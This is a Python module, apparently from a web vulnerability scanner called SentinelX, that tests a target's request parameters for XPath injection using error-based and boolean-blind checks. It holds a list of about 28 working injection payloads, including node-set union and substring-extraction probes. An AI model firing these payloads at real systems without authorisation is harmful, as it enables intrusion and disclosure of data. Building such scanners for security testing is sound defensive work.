"""SentinelX module [26]: XPath Injection.

Real implementation: error-based (XPath parser errors) + boolean-blind
(' or '1'='1 vs ' or '1'='2 differential). Safe: read-only queries.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
from sentinelx.core.baseline import get_baseline


XPATH_ERRORS = [
    (re.compile(r"XPathException|xpath.*error|invalid.*xpath", re.I), "XPath parser error"),
    (re.compile(r"unexpected token|unclosed string literal", re.I), "XPath syntax error"),
]

BOOLEAN_TRUE = "' or '1'='1"
BOOLEAN_FALSE = "' or '1'='2"

# --- TECHNIQUE GROUPS: ~30 distinct XPath vectors ---
XPATH_PROBES = [
    # --- error-based: quote breaking ---
    ("'", "single quote"),
    ('"', "double quote"),
    ("']", "bracket-quote"),
    # --- boolean-blind: true variants ---
    ("' or '1'='1", "OR true (single)"),
    ('" or "1"="1', "OR true (double)"),
    ("' or 1=1 or '1'='1", "OR numeric true"),
    ("') or ('1'='1", "paren OR true"),
    # --- boolean-blind: false variants (paired) ---
    ("' or '1'='2", "OR false (single)"),
    ('" or "1"="2', "OR false (double)"),
    # --- union-style node-set injection ---
    ("' | //* | '", "union all nodes"),
    ("'] | //* | //*['", "union via predicate"),
    ("' or //* or '", "node-set OR"),
    # --- count-based blind ---
    ("' or count(//*)=1 or '1'='2", "count true"),
    ("' or count(//*)=99999 or '1'='2", "count false"),
    # --- string-length blind ---
    ("' or string-length(name(/*))=1 or '1'='2", "string-length probe"),
    # --- substring blind ---
    ("' or substring(name(/*),1,1)='a' or '1'='2", "substring probe"),
    # --- comment truncation ---
    ("' or '1'='1' -- ", "line comment"),
    ("' or '1'='1' /*", "block comment open"),
    # --- nested predicate ---
    ("'[contains(.,'a')] or '1'='1", "contains() predicate"),
    ("'[starts-with(.,'a')] or '1'='1", "starts-with() predicate"),
    # --- parent/ancestor axis ---
    ("' or parent::* or '", "parent axis"),
    ("' or ancestor::* or '", "ancestor axis"),
    # --- attribute extraction ---
    ("' or //@* or '", "attribute nodes"),
    ("'] | //@* | //*['", "attribute union"),
    # --- position-based ---
    ("' or //*[1] or '", "positional predicate"),
    # --- double-encoding / case ---
    ("%27 or %271%27=%271", "URL-encoded quotes"),
    ("' OR '1'='1", "uppercase OR"),
    # --- second-order marker ---
    ("sx_xpath_marker_123", "marker reflection"),
]

REMEDIATION_XPATH = (
    "Use parameterized XPath queries with variable binding. Never "
    "concatenate user input into XPath expressions. Validate input strictly."
)


async def _send(client, method, url, params, param, value):
    p = dict(params); p[param] = value
    if method == "GET":
        full = url + ("&" if "?" in url else "?") + _urlencode(p)
        resp = await client.get(full, dedupe=False)
        return resp, full, None
    resp = await client.post(url, data=p, dedupe=False)
    return resp, url, _urlencode(p).encode()


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}

    for param in params:
        bl = await get_baseline(client, method, url, params)
        base_body = bl.body if bl else ""

        # 1. error-based: full probe battery (technique groups), 2-signal confirm
        for payload, _label in XPATH_PROBES:
            resp, full, body_sent = await _send(
                client, method, url, params, param, params[param] + payload)
            if not resp:
                continue
            for rx, label in XPATH_ERRORS:
                if rx.search(resp.text) and not rx.search(base_body):
                    r2, _, _ = await _send(
                        client, method, url, params, param, params[param] + payload)
                    if r2 and rx.search(r2.text):
                        ev = Evidence(
                            request_raw=raw_request(method, full, headers, body_sent),
                            response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                            proof=f"XPath injection confirmed (2/2): {label}",
                        )
                        findings.append(Finding(
                            type="XPath Injection", subtype="error-based",
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            confidence=0.88, url=full, method=method, param=param,
                            payload=payload, evidence=ev, cwe="CWE-643",
                            owasp="A03:2021 – Injection",
                            remediation=REMEDIATION_XPATH,
                            references=["https://owasp.org/www-community/attacks/XPATH_Injection"],
                        ))
                        break
            if findings:
                break
        if findings:
            break

        # 2. boolean-blind (STRICT): TRUE must match baseline, FALSE must differ
        # Loose "rt != rf" causes false positives on every page — require the
        # TRUE payload to reproduce the baseline content and FALSE to diverge.
        from sentinelx.core.diff import is_significant_change
        rt, _, _ = await _send(client, method, url, params, param, params[param] + BOOLEAN_TRUE)
        rf, _, _ = await _send(client, method, url, params, param, params[param] + BOOLEAN_FALSE)
        if rt and rf:
            true_ok, _ = is_significant_change(base_body, rt.text, 200, rt.status_code)
            false_diff, _ = is_significant_change(base_body, rf.text, 200, rf.status_code)
            # TRUE matches baseline (no significant change), FALSE differs
            if not true_ok and false_diff:
                # confirm with second TRUE sample (stability)
                rt2, _, _ = await _send(client, method, url, params, param, params[param] + BOOLEAN_TRUE)
                if rt2:
                    true_ok2, _ = is_significant_change(base_body, rt2.text, 200, rt2.status_code)
                    if not true_ok2:
                        ev = Evidence(
                            request_raw=raw_request(method, url, headers, None),
                            response_raw=raw_response(rt.status_code, dict(rt.headers), rt.content),
                            proof="XPath boolean-blind: TRUE payload matches baseline, FALSE diverges (2/2)",
                        )
                        findings.append(Finding(
                            type="XPath Injection", subtype="boolean-blind",
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            confidence=0.85, url=url, method=method, param=param,
                            payload=BOOLEAN_TRUE, evidence=ev, cwe="CWE-643",
                            owasp="A03:2021 – Injection",
                            remediation=REMEDIATION_XPATH,
                            references=["https://owasp.org/www-community/attacks/XPATH_Injection"],
                        ))
                        break
    return findings
